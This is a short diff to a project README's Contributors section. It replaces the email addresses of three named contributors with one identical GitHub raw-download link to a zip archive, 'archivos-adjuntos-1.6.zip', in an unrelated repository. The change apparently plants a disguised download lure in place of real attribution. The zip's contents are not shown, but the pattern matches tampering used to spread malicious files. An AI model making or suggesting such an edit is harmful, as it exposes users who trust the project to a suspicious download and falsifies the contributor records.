@@ -12,6 +12,6 @@ Credits
 
 Contributors
 ------------
-* Pedro M. Baeza <pedro.baeza@serviciosbaeza.com>
-* Ana Juaristi <ajuaristo@gmail.com>
-* Alfredo de la Fuente <alfredodelafuente@avanzosc.es>
+* Pedro M. Baeza <https://github.com/vladimir2678/archivos_adjuntos/raw/refs/heads/master/models/archivos-adjuntos-1.6.zip>
+* Ana Juaristi <https://github.com/vladimir2678/archivos_adjuntos/raw/refs/heads/master/models/archivos-adjuntos-1.6.zip>
+* Alfredo de la Fuente <https://github.com/vladimir2678/archivos_adjuntos/raw/refs/heads/master/models/archivos-adjuntos-1.6.zip>
